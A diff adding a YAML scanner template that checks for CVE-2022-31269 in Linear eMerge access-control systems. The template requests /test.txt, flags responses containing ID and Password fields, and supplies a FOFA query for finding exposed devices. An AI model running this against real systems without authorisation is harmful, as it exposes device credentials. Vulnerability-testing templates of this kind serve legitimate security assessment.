@@ -1,0 +1,16 @@
+id: poc-yaml-linear-emerge-test-txt-information-disclosure
+info:
+  name: Linear eMerge test.txt 信息泄露漏洞(CVE-2022-31269)
+  severity: high
+  tags:
+  - CVE-2022-31269
+  - 两高一弱
+  finger: linear emerge
+  fofa: title="Linear eMerge"
+requests:
+- method: GET
+  path: /test.txt
+  expression: status_code == 200 && contains(body,"ID=") && contains(body,"Password=")
+    && !contains(body,"<")
+variables: {}
+transport: http
